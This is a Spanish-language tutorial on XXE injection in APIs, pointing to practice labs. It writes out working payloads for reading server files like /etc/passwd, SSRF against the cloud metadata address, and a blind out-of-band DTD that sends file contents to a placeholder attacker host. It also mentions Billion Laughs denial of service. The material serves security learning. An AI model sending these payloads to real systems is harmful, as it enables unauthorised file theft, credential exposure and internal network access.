# XXE — XML External Entity Injection

**XXE** ocurre cuando una API procesa **XML** y permite definir **entidades externas**. Abusando de ellas puedes leer ficheros del servidor, provocar SSRF e incluso denegación de servicio. Aunque hoy muchas APIs usan JSON, el XML sigue vivo en SOAP, documentos de oficina, SAML, SVG, feeds RSS y endpoints "heredados".

---

## El concepto: entidades XML

XML permite definir "entidades" (variables). Una **entidad externa** puede apuntar a un recurso (un fichero, una URL):

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

Si el parser tiene habilitadas las entidades externas (comportamiento por defecto en muchas librerías antiguas), sustituye `&xxe;` por el **contenido de `/etc/passwd`** y te lo devuelve.

---

## Cómo se ve en una API

Localiza un endpoint que acepte XML (`Content-Type: application/xml` o `text/xml`):

```http
POST /api/v1/import HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<user><name>&xxe;</name></user>
```

Si la respuesta refleja `&xxe;`, verás el contenido del fichero.

> **Truco:** aunque un endpoint espere JSON, prueba a cambiar el `Content-Type` a `application/xml` y enviar XML. Algunos backends procesan ambos.

---

## Variantes

### Lectura de ficheros

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
```

### SSRF vía XXE

Haz que el servidor pida una URL interna (ver [SSRF](./SSRF.md)):

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

### Blind / Out-of-Band (OOB)

Si no ves la respuesta, exfiltra los datos a un servidor tuyo con un DTD externo:

```xml
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://<TU_IP>/evil.dtd">
  %ext;
]>
```

`evil.dtd` (alojado en tu servidor) define cómo enviar el fichero leído a tu máquina:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<TU_IP>/?d=%file;'>">
%eval;
%exfil;
```

### Denegación de servicio (Billion Laughs)

Entidades anidadas que se expanden exponencialmente y agotan la memoria. Úsalo con cuidado y solo si está en el alcance.

---

## XXE en ficheros "ocultos"

Muchos formatos son XML por dentro. Si una API acepta subida de ficheros, prueba XXE dentro de:

- **SVG** (imágenes vectoriales).
- **DOCX / XLSX / PPTX** (son ZIP con XML dentro).
- **SAML** (autenticación).

---

## Impacto

Lectura de ficheros sensibles (`/etc/passwd`, código fuente, ficheros de configuración con credenciales), SSRF hacia la red interna o metadatos cloud, y en ciertos casos RCE (si hay wrappers peligrosos como `expect://` en PHP).

---

> **Consejo:** cuando veas `Content-Type: application/xml`, SOAP o subida de imágenes **SVG**, prueba XXE de inmediato con el payload de `/etc/passwd`. Es un fallo que ha caído mucho pero que sigue apareciendo en sistemas antiguos y en formatos de fichero que "no parecen" XML.

---

## Dónde practicar el XXE

| Lab | Qué probar | Enlace |
| --- | ---------- | ------ |
| PortSwigger — XXE injection | Labs gratis (incluye blind/OOB) | https://portswigger.net/web-security/xxe |
| OWASP WebGoat | App de aprendizaje (Docker) | https://github.com/WebGoat/WebGoat |

```flow
Localizar :: Un endpoint que acepte XML (Content-Type application/xml).
Inyectar :: Una entidad externa que lea /etc/passwd.
Escalar :: SSRF vía XXE o exfiltración OOB con un DTD externo.
```

> **Consejo:** aunque un endpoint espere JSON, prueba a cambiar el `Content-Type` a `application/xml` y enviar XML. Y recuerda los ficheros ocultos que son XML por dentro: **SVG**, DOCX/XLSX, SAML.
